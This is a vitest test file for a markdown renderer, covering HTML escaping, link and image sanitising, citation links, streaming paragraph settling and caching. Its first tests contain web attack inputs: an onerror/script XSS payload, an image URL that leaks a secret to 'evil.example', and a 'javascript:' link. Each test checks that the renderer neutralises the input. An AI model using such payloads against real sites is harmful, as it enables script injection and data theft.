// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';
import { renderMarkdown as renderNodes, renderMarkdownCached, settledEnd } from './render';

/** The rendered nodes as HTML, for assertions */
function renderMarkdown(src: string, opts: Parameters<typeof renderNodes>[1]): string {
  const box = document.createElement('div');
  box.append(renderNodes(src, opts));
  return box.innerHTML;
}

describe('renderMarkdown', () => {
  it('escapes raw HTML and never makes scripts executable', () => {
    const html = renderMarkdown('<img src=x onerror=alert(1)><script>alert(1)</script>', { highlight: false });
    expect(html).not.toContain('<img');
    expect(html).not.toContain('<script');
    expect(html).toContain('&lt;script&gt;');
  });
  it('replaces external images with links', () => {
    const html = renderMarkdown('![leak](https://evil.example/?q=secret)', { highlight: false });
    expect(html).not.toContain('<img');
    expect(html).toContain('md-img-link');
  });
  it('disables javascript: links and adds rel to external links', () => {
    const html = renderMarkdown('[a](javascript:alert(1)) [b](https://ok.example)', { highlight: false });
    expect(html).not.toContain('javascript:');
    expect(html).toContain('rel="noopener noreferrer nofollow"');
  });
  it('adds a copy button to code blocks', () => {
    const html = renderMarkdown('```js\nconst a = 1 < 2;\n```', { highlight: false });
    expect(html).toContain('data-copy');
    expect(html).toContain('1 &lt; 2');
  });
  it('returns DOM nodes, not an HTML string to parse again', () => {
    expect(renderNodes('**a**', { highlight: false })).toBeInstanceOf(DocumentFragment);
  });
});

import { linkCitations } from './render';
describe('linkCitations', () => {
  it('turns ^1^ and ^1,2^ into source links and leaves unknown numbers as is', () => {
    const out = linkCitations('A^1^ B^1,2^ C^9^', ['https://a.example/x(1)', 'https://b.example/']);
    expect(out).toContain(String.raw`[\[1\]](https://a.example/x%281%29)`);
    expect(out).toContain(String.raw`[\[2\]](https://b.example/)`);
    expect(out).toContain('C[9]');
  });
  it('becomes a source link after rendering', () => {
    const html = renderMarkdown('事実^1^。', { highlight: false, citations: ['https://a.example/'] });
    expect(html).toContain('href="https://a.example/"');
  });
});

describe('settledEnd', () => {
  it('settles everything before a blank line followed by a new paragraph', () => {
    const src = 'First paragraph.\n\nSecond';
    expect(src.slice(0, settledEnd(src))).toBe('First paragraph.\n\n');
  });
  it('keeps the last block open until another block starts', () => {
    expect(settledEnd('First.\n\n')).toBe(0);
    expect(settledEnd('First.\nstill first')).toBe(0);
  });
  it('never settles inside a code fence', () => {
    const src = 'Intro.\n\n```ts\nconst a = 1;\n\nconst b = 2;\n';
    expect(src.slice(0, settledEnd(src))).toBe('Intro.\n\n');
    const closed = src + '```\n\nAfter';
    expect(closed.slice(settledEnd(closed))).toBe('After');
  });
  it('does not split a list or an indented continuation', () => {
    expect(settledEnd('- one\n\n- two')).toBe(0);
    expect(settledEnd('1. one\n\n2')).toBe(0);
    expect(settledEnd('- one\n\n  more of one')).toBe(0);
  });
  it('continues from an earlier result', () => {
    const src = 'A.\n\nB.\n\nC';
    const first = settledEnd('A.\n\nB');
    expect(src.slice(0, settledEnd(src, first))).toBe('A.\n\nB.\n\n');
  });
});

describe('renderMarkdownCached', () => {
  it('gives what renderMarkdown gives, as a copy of its own each time', () => {
    const src = '# Title\n\nSome **bold** text\n\n```js\nconst a = 1;\n```';
    const html = (f: DocumentFragment) => Array.from(f.childNodes, (n) => (n as Element).outerHTML ?? n.textContent).join('');
    const first = renderMarkdownCached(src, { highlight: false });
    expect(html(first)).toBe(html(renderNodes(src, { highlight: false })));
    // Changing one copy (a page adds a run's result) does not change the next
    first.firstChild!.textContent = 'changed';
    expect(html(renderMarkdownCached(src, { highlight: false }))).toBe(html(renderNodes(src, { highlight: false })));
  });
});
